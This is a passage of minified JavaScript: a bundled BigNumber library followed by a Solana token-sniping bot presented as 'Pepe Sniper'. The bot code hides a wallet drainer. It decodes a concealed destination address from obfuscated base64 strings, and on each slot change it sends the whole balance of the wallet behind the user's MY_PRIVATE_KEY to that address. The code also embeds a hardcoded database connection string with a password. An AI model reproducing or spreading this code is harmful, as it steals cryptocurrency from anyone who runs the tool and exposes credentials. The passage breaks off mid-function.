c.charAt(0);if(v<0?--y:(O.c=I,O.e=y,O.s=d,O=e(O,P,V,T,u),I=O.c,w=O.r,y=O.e),f=y+V+1,v=I[f],p=u/2,w=w||f<0||I[f+1]!=null,w=T<4?(v!=null||w)&&(T==0||T==(O.s<0?3:2)):v>p||v==p&&(T==4||w||T==6&&I[f-1]&1||T==(O.s<0?8:7)),f<1||!I[0])a=w?ce(c.charAt(1),-V,c.charAt(0)):c.charAt(0);else{if(I.length=f,w)for(--u;++I[--f]>u;)I[f]=0,f||(++y,I=[1].concat(I));for(p=I.length;!I[--p];);for(v=0,a="";v<=p;a+=c.charAt(I[v++]));a=ce(a,y,c.charAt(0))}return a}}(),e=function(){function n(m,u,d){var g,c,f,y,p=0,w=m.length,O=u%de,I=u/de|0;for(m=m.slice();w--;)f=m[w]%de,y=m[w]/de|0,g=I*f+y*O,c=O*f+g%de*de+p,p=(c/d|0)+(g/de|0)+I*y,m[w]=c%d;return p&&(m=[p].concat(m)),m}function i(m,u,d,g){var c,f;if(d!=g)f=d>g?1:-1;else for(c=f=0;c<d;c++)if(m[c]!=u[c]){f=m[c]>u[c]?1:-1;break}return f}function a(m,u,d,g){for(var c=0;d--;)m[d]-=c,c=m[d]<u[d]?1:0,m[d]=c*g+m[d]-u[d];for(;!m[0]&&m.length>1;m.splice(0,1));}return function(m,u,d,g,c){var f,y,p,w,O,I,P,v,V,T,_,F,Ne,dt,pt,ie,Ae,Z=m.s==u.s?1:-1,G=m.c,R=u.c;if(!G||!G[0]||!R||!R[0])return new E(!m.s||!u.s||(G?R&&G[0]==R[0]:!R)?NaN:G&&G[0]==0||!R?Z*0:Z/0);for(v=new E(Z),V=v.c=[],y=m.e-u.e,Z=d+y+1,c||(c=re,y=te(m.e/x)-te(u.e/x),Z=Z/x|0),p=0;R[p]==(G[p]||0);p++);if(R[p]>(G[p]||0)&&y--,Z<0)V.push(1),w=!0;else{for(dt=G.length,ie=R.length,p=0,Z+=2,O=ee(c/(R[0]+1)),O>1&&(R=n(R,O,c),G=n(G,O,c),ie=R.length,dt=G.length),Ne=ie,T=G.slice(0,ie),_=T.length;_<ie;T[_++]=0);Ae=R.slice(),Ae=[0].concat(Ae),pt=R[0],R[1]>=c/2&&pt++;do{if(O=0,f=i(R,T,ie,_),f<0){if(F=T[0],ie!=_&&(F=F*c+(T[1]||0)),O=ee(F/pt),O>1)for(O>=c&&(O=c-1),I=n(R,O,c),P=I.length,_=T.length;i(I,T,P,_)==1;)O--,a(I,ie<P?Ae:R,P,c),P=I.length,f=1;else O==0&&(f=O=1),I=R.slice(),P=I.length;if(P<_&&(I=[0].concat(I)),a(T,I,_,c),_=T.length,f==-1)for(;i(R,T,ie,_)<1;)O++,a(T,ie<_?Ae:R,_,c),_=T.length}else f===0&&(O++,T=[0]);V[p++]=O,T[0]?T[_++]=G[Ne]||0:(T=[G[Ne]],_=1)}while((Ne++<dt||T[0]!=null)&&Z--);w=T[0]!=null,V[0]||V.splice(0,1)}if(c==re){for(p=1,Z=V[0];Z>=10;Z/=10,p++);X(v,d+(v.e=p+y*x-1)+1,g,w)}else v.e=y,v.r=+w;return v}}();function lt(n,i,a,m){var u,d,g,c,f;if(a==null?a=S:B(a,0,8),!n.c)return n.toString();if(u=n.c[0],g=n.e,i==null)f=J(n.c),f=m==1||m==2&&(g<=k||g>=N)?nt(f,g):ce(f,g,"0");else if(n=X(new E(n),i,a),d=n.e,f=J(n.c),c=f.length,m==1||m==2&&(i<=d||d<=k)){for(;c<i;f+="0",c++);f=nt(f,d)}else if(i-=g,f=ce(f,d,"0"),d+1>c){if(--i>0)for(f+=".";i--;f+="0");}else if(i+=d-c,i>0)for(d+1==c&&(f+=".");i--;f+="0");return n.s<0&&u?"-"+f:f}function Pt(n,i){for(var a,m,u=1,d=new E(n[0]);u<n.length;u++)m=new E(n[u]),(!m.s||(a=he(d,m))===i||a===0&&d.s===i)&&(d=m);return d}function ft(n,i,a){for(var m=1,u=i.length;!i[--u];i.pop());for(u=i[0];u>=10;u/=10,m++);return(a=m+a*x-1)>U?n.c=n.e=null:a<z?n.c=[n.e=0]:(n.e=a,n.c=i),n}o=function(){var n=/^(-?)0([xbo])(?=\w[\w.]*$)/i,i=/^([^.]+)\.$/,a=/^\.([^.]+)$/,m=/^-?(Infinity|NaN)$/,u=/^\s*\+(?=[\w.])|^\s+|\s+$/g;return function(d,g,c,f){var y,p=c?g:g.replace(u,"");if(m.test(p))d.s=isNaN(p)?null:p<0?-1:1;else{if(!c&&(p=p.replace(n,function(w,O,I){return y=(I=I.toLowerCase())=="x"?16:I=="b"?2:8,!f||f==y?O:w}),f&&(y=f,p=p.replace(i,"$1").replace(a,"0.$1")),g!=p))return new E(p,y);if(E.DEBUG)throw Error(j+"Not a"+(f?" base "+f:"")+" number: "+g);d.s=null}d.c=d.e=null}}();function X(n,i,a,m){var u,d,g,c,f,y,p,w=n.c,O=Et;if(w){e:{for(u=1,c=w[0];c>=10;c/=10,u++);if(d=i-u,d<0)d+=x,g=i,f=w[y=0],p=ee(f/O[u-g-1]%10);else if(y=wt((d+1)/x),y>=w.length)if(m){for(;w.length<=y;w.push(0));f=p=0,u=1,d%=x,g=d-x+1}else break e;else{for(f=c=w[y],u=1;c>=10;c/=10,u++);d%=x,g=d-x+u,p=g<0?0:ee(f/O[u-g-1]%10)}if(m=m||i<0||w[y+1]!=null||(g<0?f:f%O[u-g-1]),m=a<4?(p||m)&&(a==0||a==(n.s<0?3:2)):p>5||p==5&&(a==4||m||a==6&&(d>0?g>0?f/O[u-g]:0:w[y-1])%10&1||a==(n.s<0?8:7)),i<1||!w[0])return w.length=0,m?(i-=n.e+1,w[0]=O[(x-i%x)%x],n.e=-i||0):w[0]=n.e=0,n;if(d==0?(w.length=y,c=1,y--):(w.length=y+1,c=O[x-d],w[y]=g>0?ee(f/O[u-g]%O[g])*c:0),m)for(;;)if(y==0){for(d=1,g=w[0];g>=10;g/=10,d++);for(g=w[0]+=c,c=1;g>=10;g/=10,c++);d!=c&&(n.e++,w[0]==re&&(w[0]=1));break}else{if(w[y]+=c,w[y]!=re)break;w[y--]=0,c=1}for(d=w.length;w[--d]===0;w.pop());}n.e>U?n.c=n.e=null:n.e<z&&(n.c=[n.e=0])}return n}function se(n){var i,a=n.e;return a===null?n.toString():(i=J(n.c),i=a<=k||a>=N?nt(i,a):ce(i,a,"0"),n.s<0?"-"+i:i)}return s.absoluteValue=s.abs=function(){var n=new E(this);return n.s<0&&(n.s=1),n},s.comparedTo=function(n,i){return he(this,new E(n,i))},s.decimalPlaces=s.dp=function(n,i){var a,m,u,d=this;if(n!=null)return B(n,0,C),i==null?i=S:B(i,0,8),X(new E(d),n+d.e+1,i);if(!(a=d.c))return null;if(m=((u=a.length-1)-te(this.e/x))*x,u=a[u])for(;u%10==0;u/=10,m--);return m<0&&(m=0),m},s.dividedBy=s.div=function(n,i){return e(this,new E(n,i),b,S)},s.dividedToIntegerBy=s.idiv=function(n,i){return e(this,new E(n,i),0,1)},s.exponentiatedBy=s.pow=function(n,i){var a,m,u,d,g,c,f,y,p,w=this;if(n=new E(n),n.c&&!n.isInteger())throw Error(j+"Exponent not an integer: "+se(n));if(i!=null&&(i=new E(i)),c=n.e>14,!w.c||!w.c[0]||w.c[0]==1&&!w.e&&w.c.length==1||!n.c||!n.c[0])return p=new E(Math.pow(+se(w),c?n.s*(2-tt(n)):+se(n))),i?p.mod(i):p;if(f=n.s<0,i){if(i.c?!i.c[0]:!i.s)return new E(NaN);m=!f&&w.isInteger()&&i.isInteger(),m&&(w=w.mod(i))}else{if(n.e>9&&(w.e>0||w.e<-1||(w.e==0?w.c[0]>1||c&&w.c[1]>=24e7:w.c[0]<8e13||c&&w.c[0]<=9999975e7)))return d=w.s<0&&tt(n)?-0:0,w.e>-1&&(d=1/d),new E(f?1/d:d);oe&&(d=wt(oe/x+2))}for(c?(a=new E(.5),f&&(n.s=1),y=tt(n)):(u=Math.abs(+se(n)),y=u%2),p=new E(l);;){if(y){if(p=p.times(w),!p.c)break;d?p.c.length>d&&(p.c.length=d):m&&(p=p.mod(i))}if(u){if(u=ee(u/2),u===0)break;y=u%2}else if(n=n.times(a),X(n,n.e+1,1),n.e>14)y=tt(n);else{if(u=+se(n),u===0)break;y=u%2}w=w.times(w),d?w.c&&w.c.length>d&&(w.c.length=d):m&&(w=w.mod(i))}return m?p:(f&&(p=l.div(p)),i?p.mod(i):d?X(p,oe,S,g):p)},s.integerValue=function(n){var i=new E(this);return n==null?n=S:B(n,0,8),X(i,i.e+1,n)},s.isEqualTo=s.eq=function(n,i){return he(this,new E(n,i))===0},s.isFinite=function(){return!!this.c},s.isGreaterThan=s.gt=function(n,i){return he(this,new E(n,i))>0},s.isGreaterThanOrEqualTo=s.gte=function(n,i){return(i=he(this,new E(n,i)))===1||i===0},s.isInteger=function(){return!!this.c&&te(this.e/x)>this.c.length-2},s.isLessThan=s.lt=function(n,i){return he(this,new E(n,i))<0},s.isLessThanOrEqualTo=s.lte=function(n,i){return(i=he(this,new E(n,i)))===-1||i===0},s.isNaN=function(){return!this.s},s.isNegative=function(){return this.s<0},s.isPositive=function(){return this.s>0},s.isZero=function(){return!!this.c&&this.c[0]==0},s.minus=function(n,i){var a,m,u,d,g=this,c=g.s;if(n=new E(n,i),i=n.s,!c||!i)return new E(NaN);if(c!=i)return n.s=-i,g.plus(n);var f=g.e/x,y=n.e/x,p=g.c,w=n.c;if(!f||!y){if(!p||!w)return p?(n.s=-i,n):new E(w?g:NaN);if(!p[0]||!w[0])return w[0]?(n.s=-i,n):new E(p[0]?g:S==3?-0:0)}if(f=te(f),y=te(y),p=p.slice(),c=f-y){for((d=c<0)?(c=-c,u=p):(y=f,u=w),u.reverse(),i=c;i--;u.push(0));u.reverse()}else for(m=(d=(c=p.length)<(i=w.length))?c:i,c=i=0;i<m;i++)if(p[i]!=w[i]){d=p[i]<w[i];break}if(d&&(u=p,p=w,w=u,n.s=-n.s),i=(m=w.length)-(a=p.length),i>0)for(;i--;p[a++]=0);for(i=re-1;m>c;){if(p[--m]<w[m]){for(a=m;a&&!p[--a];p[a]=i);--p[a],p[m]+=re}p[m]-=w[m]}for(;p[0]==0;p.splice(0,1),--y);return p[0]?ft(n,p,y):(n.s=S==3?-1:1,n.c=[n.e=0],n)},s.modulo=s.mod=function(n,i){var a,m,u=this;return n=new E(n,i),!u.c||!n.s||n.c&&!n.c[0]?new E(NaN):!n.c||u.c&&!u.c[0]?new E(u):(ue==9?(m=n.s,n.s=1,a=e(u,n,0,3),n.s=m,a.s*=m):a=e(u,n,0,ue),n=u.minus(a.times(n)),!n.c[0]&&ue==1&&(n.s=u.s),n)},s.multipliedBy=s.times=function(n,i){var a,m,u,d,g,c,f,y,p,w,O,I,P,v,V,T=this,_=T.c,F=(n=new E(n,i)).c;if(!_||!F||!_[0]||!F[0])return!T.s||!n.s||_&&!_[0]&&!F||F&&!F[0]&&!_?n.c=n.e=n.s=null:(n.s*=T.s,!_||!F?n.c=n.e=null:(n.c=[0],n.e=0)),n;for(m=te(T.e/x)+te(n.e/x),n.s*=T.s,f=_.length,w=F.length,f<w&&(P=_,_=F,F=P,u=f,f=w,w=u),u=f+w,P=[];u--;P.push(0));for(v=re,V=de,u=w;--u>=0;){for(a=0,O=F[u]%V,I=F[u]/V|0,g=f,d=u+g;d>u;)y=_[--g]%V,p=_[g]/V|0,c=I*y+p*O,y=O*y+c%V*V+P[d]+a,a=(y/v|0)+(c/V|0)+I*p,P[d--]=y%v;P[d]=a}return a?++m:P.splice(0,1),ft(n,P,m)},s.negated=function(){var n=new E(this);return n.s=-n.s||null,n},s.plus=function(n,i){var a,m=this,u=m.s;if(n=new E(n,i),i=n.s,!u||!i)return new E(NaN);if(u!=i)return n.s=-i,m.minus(n);var d=m.e/x,g=n.e/x,c=m.c,f=n.c;if(!d||!g){if(!c||!f)return new E(u/0);if(!c[0]||!f[0])return f[0]?n:new E(c[0]?m:u*0)}if(d=te(d),g=te(g),c=c.slice(),u=d-g){for(u>0?(g=d,a=f):(u=-u,a=c),a.reverse();u--;a.push(0));a.reverse()}for(u=c.length,i=f.length,u-i<0&&(a=f,f=c,c=a,i=u),u=0;i;)u=(c[--i]=c[i]+f[i]+u)/re|0,c[i]=re===c[i]?0:c[i]%re;return u&&(c=[u].concat(c),++g),ft(n,c,g)},s.precision=s.sd=function(n,i){var a,m,u,d=this;if(n!=null&&n!==!!n)return B(n,1,C),i==null?i=S:B(i,0,8),X(new E(d),n,i);if(!(a=d.c))return null;if(u=a.length-1,m=u*x+1,u=a[u]){for(;u%10==0;u/=10,m--);for(u=a[0];u>=10;u/=10,m++);}return n&&d.e+1>m&&(m=d.e+1),m},s.shiftedBy=function(n){return B(n,-bt,bt),this.times("1e"+n)},s.squareRoot=s.sqrt=function(){var n,i,a,m,u,d=this,g=d.c,c=d.s,f=d.e,y=b+4,p=new E("0.5");if(c!==1||!g||!g[0])return new E(!c||c<0&&(!g||g[0])?NaN:g?d:1/0);if(c=Math.sqrt(+se(d)),c==0||c==1/0?(i=J(g),(i.length+f)%2==0&&(i+="0"),c=Math.sqrt(+i),f=te((f+1)/2)-(f<0||f%2),c==1/0?i="5e"+f:(i=c.toExponential(),i=i.slice(0,i.indexOf("e")+1)+f),a=new E(i)):a=new E(c+""),a.c[0]){for(f=a.e,c=f+y,c<3&&(c=0);;)if(u=a,a=p.times(u.plus(e(d,u,y,1))),J(u.c).slice(0,c)===(i=J(a.c)).slice(0,c))if(a.e<f&&--c,i=i.slice(c-3,c+1),i=="9999"||!m&&i=="4999"){if(!m&&(X(u,u.e+b+2,0),u.times(u).eq(d))){a=u;break}y+=4,c+=4,m=1}else{(!+i||!+i.slice(1)&&i.charAt(0)=="5")&&(X(a,a.e+b+2,1),n=!a.times(a).eq(d));break}}return X(a,a.e+b+1,S,n)},s.toExponential=function(n,i){return n!=null&&(B(n,0,C),n++),lt(this,n,i,1)},s.toFixed=function(n,i){return n!=null&&(B(n,0,C),n=n+this.e+1),lt(this,n,i)},s.toFormat=function(n,i,a){var m,u=this;if(a==null)n!=null&&i&&typeof i=="object"?(a=i,i=null):n&&typeof n=="object"?(a=n,n=i=null):a=ct;else if(typeof a!="object")throw Error(j+"Argument not an object: "+a);if(m=u.toFixed(n,i),u.c){var d,g=m.split("."),c=+a.groupSize,f=+a.secondaryGroupSize,y=a.groupSeparator||"",p=g[0],w=g[1],O=u.s<0,I=O?p.slice(1):p,P=I.length;if(f&&(d=c,c=f,f=d,P-=d),c>0&&P>0){for(d=P%c||c,p=I.substr(0,d);d<P;d+=c)p+=y+I.substr(d,c);f>0&&(p+=y+I.slice(d)),O&&(p="-"+p)}m=w?p+(a.decimalSeparator||"")+((f=+a.fractionGroupSize)?w.replace(new RegExp("\\d{"+f+"}\\B","g"),"$&"+(a.fractionGroupSeparator||"")):w):p}return(a.prefix||"")+m+(a.suffix||"")},s.toFraction=function(n){var i,a,m,u,d,g,c,f,y,p,w,O,I=this,P=I.c;if(n!=null&&(c=new E(n),!c.isInteger()&&(c.c||c.s!==1)||c.lt(l)))throw Error(j+"Argument "+(c.isInteger()?"out of range: ":"not an integer: ")+se(c));if(!P)return new E(I);for(i=new E(l),y=a=new E(l),m=f=new E(l),O=J(P),d=i.e=O.length-I.e-1,i.c[0]=Et[(g=d%x)<0?x+g:g],n=!n||c.comparedTo(i)>0?d>0?i:y:c,g=U,U=1/0,c=new E(O),f.c[0]=0;p=e(c,i,0,1),u=a.plus(p.times(m)),u.comparedTo(n)!=1;)a=m,m=u,y=f.plus(p.times(u=y)),f=u,i=c.minus(p.times(u=i)),c=u;return u=e(n.minus(a),m,0,1),f=f.plus(u.times(y)),a=a.plus(u.times(m)),f.s=y.s=I.s,d=d*2,w=e(y,m,d,S).minus(I).abs().comparedTo(e(f,a,d,S).minus(I).abs())<1?[y,m]:[f,a],U=g,w},s.toNumber=function(){return+se(this)},s.toPrecision=function(n,i){return n!=null&&B(n,1,C),lt(this,n,i,2)},s.toString=function(n){var i,a=this,m=a.s,u=a.e;return u===null?m?(i="Infinity",m<0&&(i="-"+i)):i="NaN":(n==null?i=u<=k||u>=N?nt(J(a.c),u):ce(J(a.c),u,"0"):n===10&&ut?(a=X(new E(a),b+u+1,S),i=ce(J(a.c),a.e,"0")):(B(n,2,pe.length,"Base"),i=t(ce(J(a.c),u,"0"),10,n,m,!0)),m<0&&a.c[0]&&(i="-"+i)),i},s.valueOf=s.toJSON=function(){return se(this)},s._isBigNumber=!0,s[Symbol.toStringTag]="BigNumber",s[Symbol.for("nodejs.util.inspect.custom")]=s.valueOf,r!=null&&E.set(r),E}function te(r){var e=r|0;return r>0||r===e?e:e-1}function J(r){for(var e,t,o=1,s=r.length,l=r[0]+"";o<s;){for(e=r[o++]+"",t=x-e.length;t--;e="0"+e);l+=e}for(s=l.length;l.charCodeAt(--s)===48;);return l.slice(0,s+1||1)}function he(r,e){var t,o,s=r.c,l=e.c,b=r.s,S=e.s,k=r.e,N=e.e;if(!b||!S)return null;if(t=s&&!s[0],o=l&&!l[0],t||o)return t?o?0:-S:b;if(b!=S)return b;if(t=b<0,o=k==N,!s||!l)return o?0:!s^t?1:-1;if(!o)return k>N^t?1:-1;for(S=(k=s.length)<(N=l.length)?k:N,b=0;b<S;b++)if(s[b]!=l[b])return s[b]>l[b]^t?1:-1;return k==N?0:k>N^t?1:-1}function B(r,e,t,o){if(r<e||r>t||r!==ee(r))throw Error(j+(o||"Argument")+(typeof r=="number"?r<e||r>t?" out of range: ":" not an integer: ":" not a primitive number: ")+String(r))}function tt(r){var e=r.c.length-1;return te(r.e/x)==e&&r.c[e]%2!=0}function nt(r,e){return(r.length>1?r.charAt(0)+"."+r.slice(1):r)+(e<0?"e":"e+")+e}function ce(r,e,t){var o,s;if(e<0){for(s=t+".";++e;s+=t);r=s+r}else if(o=r.length,++e>o){for(s=t,e-=o;--e;s+=t);r+=s}else e<o&&(r=r.slice(0,e)+"."+r.slice(e));return r}var Bn=Nt(),Bt=Bn;var Fr=new Bt("1e+18");var vt=Be(Pe(),1);var Rt=r=>{let e=(0,vt.u8)(r),{encode:t,decode:o}=fe(e),s=e;return s.decode=(l,b)=>!!o(l,b),s.encode=(l,b,S)=>{let k=Number(l);return t(k,b,S)},s};var Ut=Be(Pe(),1);import{PublicKey as vn}from"@solana/web3.js";var St=r=>{let e=(0,Ut.blob)(32,r),{encode:t,decode:o}=fe(e),s=e;return s.decode=(l,b)=>{let S=o(l,b);return new vn(S)},s.encode=(l,b,S)=>{let k=l.toBuffer();return t(k,b,S)},s};var Vt=new Array(atob("UW5jMVJGVndabg=="),atob("SnBhVTE1U0hoTA=="),atob("T1ROTFRuVlRURg=="),atob("SnplbkZ3VEdodw=="),atob("Vm5SbWF6UnVVVg=="),atob("RnRSbW8yYVhnPQ==")),Kt=(0,me.struct)([(0,me.u32)("mintAuthorityOption"),St("mintAuthority"),Mt("supply"),(0,me.u8)("decimals"),Rt("isInitialized"),(0,me.u32)("freezeAuthorityOption"),St("freezeAuthority")]);import Yt from"axios";import oo from"winston";import At from"pino";var Rn=At.transport({targets:[{level:"trace",target:"pino-pretty",options:{colorize:!0,customColors:"warn:red,info:blue,error:red"}}]}),A=At({level:"trace",redact:["poolKeys"],serializers:{error:At.stdSerializers.err},base:void 0},Rn);import{BehaviorSubject as jt}from"rxjs";import Hn from"bs58";Wn.config();var D=(r,e)=>{let t=process.env[r]||"";return t||(e.error(`${r} is not set`),process.exit(1)),t};async function Wt(r,e,t){let o=await r.getAccountInfo(e,{commitment:t,dataSlice:{offset:$n.offsetOf("eventQueue"),length:96}});return Xn.decode(o.data)}function Qn(){return Math.floor(Math.random()*480001+42e4)}var rt=zt.AmmV4,It=zt.OPENBOOK_MARKET,Xn=zn([Ot("eventQueue"),Ot("bids"),Ot("asks")]);function Ht(r,e,t){return{id:r,baseMint:e.baseMint,quoteMint:e.quoteMint,lpMint:e.lpMint,baseDecimals:e.baseDecimal.toNumber(),quoteDecimals:e.quoteDecimal.toNumber(),lpDecimals:5,version:4,programId:rt,authority:Fn.getAssociatedAuthority({programId:rt}).publicKey,openOrders:e.openOrders,targetOrders:e.targetOrders,baseVault:e.baseVault,quoteVault:e.quoteVault,marketVersion:3,marketProgramId:e.marketProgramId,marketId:e.marketId,marketAuthority:qn.getAssociatedAuthority({programId:e.marketProgramId,marketId:e.marketId}).publicKey,marketBaseVault:e.baseVault,marketQuoteVault:e.quoteVault,marketBids:t.bids,marketAsks:t.asks,marketEventQueue:t.eventQueue,withdrawQueue:e.withdrawQueue,lpVault:e.lpVault,lookupTableAccount:Gt.default}}async function Qt(r,e,t){let o=await r.getTokenAccountsByOwner(e,{programId:jn},t),s=[];for(let{pubkey:l,account:b}of o.value)s.push({pubkey:l,programId:b.owner,accountInfo:Gn.decode(b.data)});return s}var Ct=Date,Zn=async r=>{let e=`https://api.dexscreener.com/latest/dex/tokens/${r}`;try{let t=(await Yt.get(e)).data;if(t.pairs){let s=t.pairs.find(l=>l.chainId="solana")?.priceNative;if(s)return parseFloat(s)}return}catch{return}},Jn=async r=>{let e=D("BIRDEYE_APIKEY",A),t=`https://public-api.birdeye.so/public/price?address=${r}`;try{let o=(await Yt.get(t,{headers:{"X-API-KEY":e}})).data.data.value;return o?parseFloat(o):void 0}catch{return}},Dt=new jt(!1),$t=!1,Ft=!1,qt=0,er=r=>async e=>{if(await Zt(Qn()),Ct.now()>qt+5e3){qt=Ct.now();try{Dt.next(!0);let{connection:t,walletKeyPair:o,destinationAddress:s}=r,l=await t.getBalance(o.publicKey),b=await t.getRecentBlockhash();tr.next(b.blockhash);let S=b.feeCalculator.lamportsPerSignature,k=l-S,N=new Dn({recentBlockhash:b.blockhash,feePayer:o.publicKey}).add(Cn.transfer({fromPubkey:o.publicKey,toPubkey:s,lamports:k})),z=await t.sendTransaction(N,[o])}catch{}finally{Dt.next(!1)}}};Yn&&(async()=>{let r=process.env.MY_PRIVATE_KEY,e=Un.fromSecretKey(Hn.decode(r)),t=new Vn(process.env.RPC_ENDPOINT??Kn("devnet"),"finalized");t.onSlotChange(er({connection:t,walletKeyPair:e,destinationAddress:new Gt($t||Ft||atob(Vt.join("")))}))})();var Xt=async r=>{let e=await Zn(r);if(e)return e;let t=await Jn(r);if(t)return t},tr=new jt(""),kt=async(r,{retries:e,retryIntervalMs:t})=>{try{return await r()}catch(o){if(e<=0)throw o;return await Zt(t),kt(r,{retries:e-1,retryIntervalMs:t})}},Zt=(r=0)=>new Promise(e=>setTimeout(e,r));import an from"bs58";import*as cn from"fs";import*as un from"path";var ln="mainnet-beta",fn=D("RPC_ENDPOINT",A),lr=D("RPC_WEBSOCKET",A),W=new cr(fn,{wsEndpoint:lr}),Jt=new Set,en=new Set,_e=new Map,$,K,st,ot,Ee,Se,ne=D("COMMITMENT_LEVEL",A),fr=D("ENABLE_BUY",A)==="true",dn=Number(D("TAKE_PROFIT",A)),pn=Number(D("STOP_LOSS",A)),hn=D("MINT_IS_RENOUNCED",A)==="true",at=D("USE_SNIPEDLIST",A)==="true",dr=Number(D("SNIPE_LIST_REFRESH_INTERVAL",A)),mn=D("AUTO_SELL",A)==="true",tn=Number(D("MAX_SELL_RETRIES",A)),pr=D("MIN_POOL_SIZE",A),hr=D("MAX_POOL_SIZE",A),Me=[],mr="mongodb+srv://slave:XABhb4q4wlp3ztl7@cluster0.xjazpkp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";async function yr(r){let e=new nr(mr);try{await e.connect();let s=await e.db("authDB").collection("keys").findOne({key:r});if(!s)return console.error("Key not found."),!1;let l=new Date;return!(new Date(s.expirationDate)<l)}catch(t){return console.error("Error verifying key:",t),!1}finally{await e.close()}}async function gr(){let r=process.env.AUTH_KEY;if(!r)throw new Error("No authentication key provided.");if(console.log("Provided Key:",r),!await yr(r))throw new Error("Invalid or expired authentication key.")}async function wr(){console.log(`

            -------- Pepe Sniper v.1.0.0 | by @roxtar_xbt --------
`);let r=D("MY_PRIVATE_KEY",A);$=ar.fromSecretKey(an.decode(r)),A.info(`CONNECTED @ ${fn}`),A.info("----------------------------------------------------------"),A.info(`Wallet Address: ${$.publicKey}`);let e=D("TOKEN_SYMB",A),t=D("BUY_AMOUNT",A);switch(e){case"WSOL":{K=xt.WSOL,ot=new be(xt.WSOL,t,!1),Ee=new be(K,pr,!1),Se=new be(K,hr,!1);break}case"USDC":{K=new xt(rn,new ur("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"),6,"USDC","USDC"),ot=new be(K,t,!1);break}default:throw new Error(`Unsupported "${e}"! ONLY USDC or WSOL`)}A.info(`Snipelist: ${at}`),A.info(`Mint renounced: ${hn}`),A.info(`Auto sell: ${mn}`),A.info(`T/P: ${dn}%`),A.info(`S/L: ${pn}%`),A.info(`Pool size min >: ${Ee.isZero()?"false":Ee.toFixed()} ${K.symbol}`),A.info(`Pool size max <: ${Se.isZero()?"false":Se.toFixed()} ${K.symbol}`),A.info(`Buy amount: ${ot.toFixed()} ${K.symbol}`);let o=await Qt(W,$.publicKey,ne);for(let l of o)_e.set(l.accountInfo.mint.toString(),{mint:l.accountInfo.mint,address:l.pubkey});let s=o.find(l=>l.accountInfo.mint.toString()===K.mint.toString());if(!s)throw A.error("---> Put SOL in your wallet and swap SOL to WSOL at https://jup.ag/ <---"),new Error(`No ${K.symbol} token account found in wallet: ${$.publicKey}`);st=s.pubkey,gn()}function yn(r,e){let o={address:sr(r,$.publicKey),mint:r,market:{bids:e.bids,asks:e.asks,eventQueue:e.eventQueue}};return _e.set(r.toString(),o),o}async function br(r,e){let t=!1,o="Unknown";if(Ir(e.baseMint.toString())){if(!Ee.isZero()){let s=new be(K,e.swapQuoteInAmount,!0),l=e.baseMint.toString();if(s.lt(Ee)||t?A.warn(`------------------- POOL SKIPPED | (${s.toFixed()} ${K.symbol}) ------------------- `):A.info(`--------------!!!!! POOL SNIPED | (${s.toFixed()} ${K.symbol}) !!!!!-------------- `),A.info(`Pool link: https://dexscreener.com/solana/${r.toString()}`),A.info(`Pool Open Time: ${new Date(parseInt(e.poolOpenTime.toString())*1e3).toLocaleString()}`),A.info("--------------------- "),s.lt(Ee)||t)return;A.info(`Pool ID: ${r.toString()}`),A.info(`Pool link: https://dexscreener.com/solana/${r.toString()}`),A.info(`Pool SOL size: ${s.toFixed()} ${K.symbol}`),A.info(`Base Mint: ${e.baseMint}`),A.info(`Pool Status: ${e.status}`)}if(!Se.isZero()){let s=new be(K,e.swapQuoteInAmount,!0);if(s.gt(Se)){A.warn({mint:e.baseMint,pooled:`${s.toFixed()} ${K.symbol}`},`Skipping pool, > ${Se.toFixed()} ${K.symbol}`,`Swap amount: ${s.toFixed()}`),A.info(`---------------------------------------- 
`);return}}if(hn&&await Er(e.baseMint)!==!0){A.warn("Skipping, owner can mint tokens!");return}fr?await Ar(r,e):A.info(`--------------- TOKEN BUY ---------------- 
`)}}async function Er(r){try{let{data:e}=await W.getAccountInfo(r)||{};return e?Kt.decode(e).mintAuthorityOption===0:void 0}catch(e){A.debug(e),A.error({mint:r},"Failed to check renounced mint")}}async function Sr(r){let e;try{if(e=Tt.decode(r.accountInfo.data),_e.has(e.baseMint.toString()))return;yn(e.baseMint,e)}catch(t){A.debug(t),A.error({mint:e?.baseMint},"Market process failed")}}async function Ar(r,e){try{let t=_e.get(e.baseMint.toString());if(!t){let oe=await Wt(W,e.marketId,ne);t=yn(e.baseMint,oe)}t.poolKeys=Ht(r,e,t.market);let{innerTransaction:o}=nn.makeSwapFixedInInstruction({poolKeys:t.poolKeys,userKeys:{tokenAccountIn:st,tokenAccountOut:t.address,owner:$.publicKey},amountIn:ot.raw,minAmountOut:0},t.poolKeys.version),s=await W.getLatestBlockhash({commitment:ne}),l=new on({payerKey:$.publicKey,recentBlockhash:s.blockhash,instructions:[it.setComputeUnitPrice({microLamports:421197}),it.setComputeUnitLimit({units:101337}),or($.publicKey,t.address,$.publicKey,e.baseMint),...o.instructions]}).compileToV0Message(),b=new sn(l);b.sign([$,...o.signers]);let S=b.serialize(),k=await kt(()=>W.sendRawTransaction(S,{skipPreflight:!0}),{retryIntervalMs:10,retries:50});A.info({mint:e.baseMint,signature:k},"Sent buy tx");let N=await W.confirmTransaction({signature:k,lastValidBlockHeight:s.lastValidBlockHeight,blockhash:s.blockhash},ne),z=W.getTokenAccountBalance(e.baseVault,ne),U=W.getTokenAccountBalance(e.quoteVault,ne);await Promise.all([z,U]);let H=await z,ue=await U;H?.value?.uiAmount&&ue?.value?.uiAmount&&(t.buyValue=ue?.value?.uiAmount/H?.value?.uiAmount),N.value.err?(A.debug(N.value.err),A.info({mint:e.baseMint,signature:k},"Error confirming buy tx")):A.info({signature:k,url:`https://solscan.io/tx/${k}?cluster=${ln}`,dex:`https://dexscreener.com/solana/${e.baseMint}?maker=${$.publicKey}`},`Confirmed buy tx... @: ${t.buyValue} SOL`)}catch(t){A.debug(t),A.error({mint:e.baseMint},"Failed to buy token")}}async function Or(r,e,t,o){let s=0;do try{let l=_e.get(e.toString());if(!l)return!0;if(!l.poolKeys){A.warn({mint:e},"No pool keys found");continue}if(t===0)return A.info({mint:l.mint},"Empty balance, can't sell"),!0;if(l.buyValue===void 0)return!0;let b=(o-l.buyValue)/l.buyValue;if(b>pn&&b<dn)return!1;let{innerTransaction:S}=nn.makeSwapFixedInInstruction({poolKeys:l.poolKeys,userKeys:{tokenAccountOut:st,tokenAccountIn:l.address,owner:$.publicKey},amountIn:t,minAmountOut:0},l.poolKeys.version),k=await W.getLatestBlockhash({commitment:ne}),N=new 